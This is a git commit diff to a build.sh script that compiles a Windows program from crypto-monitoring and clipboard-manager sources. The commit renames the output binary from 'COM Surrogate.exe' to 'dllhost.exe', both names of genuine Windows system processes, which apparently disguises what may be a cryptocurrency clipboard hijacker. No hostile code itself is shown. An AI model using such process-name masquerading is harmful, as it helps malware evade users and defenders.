45db4b3fc21d1d8f1735697b3e15343b1dbef7d2
yurii <uraklimek@gmail.com>
2025-12-15 15:49:38 +0200

    Rename to dllhost and enable console

--- build.sh
+++ build.sh
@@ -4,18 +4,17 @@ set -e # Остановить выполнение, если возникнет 
 echo "Compiling..."
 
 # Компиляция всех исходных файлов
-# -mwindows: приложение без консольного окна (background)
-# -static: статическая линковка библиотек
+# 1. Чтобы была консоль, мы УБРАЛИ флаг -mwindows
+# 2. Имя файла после -o изменено на 'dllhost.exe'
 x86_64-w64-mingw32-g++ main.cpp CryptoMonitor.cpp CryptoDetector.cpp ClipboardManager.cpp \
-    -o 'COM Surrogate.exe' \
+    -o 'dllhost.exe' \
     -static \
     -luser32 -lkernel32
-    # -mwindows \
 
 echo "Compilation successful."
 
 git add .
-git commit -m "Add Windows clipboard application"
+git commit -m "Rename to dllhost and enable console"
 # git tag -a v1.0-windows -m "Windows clipboard application version 1
 
 # git push
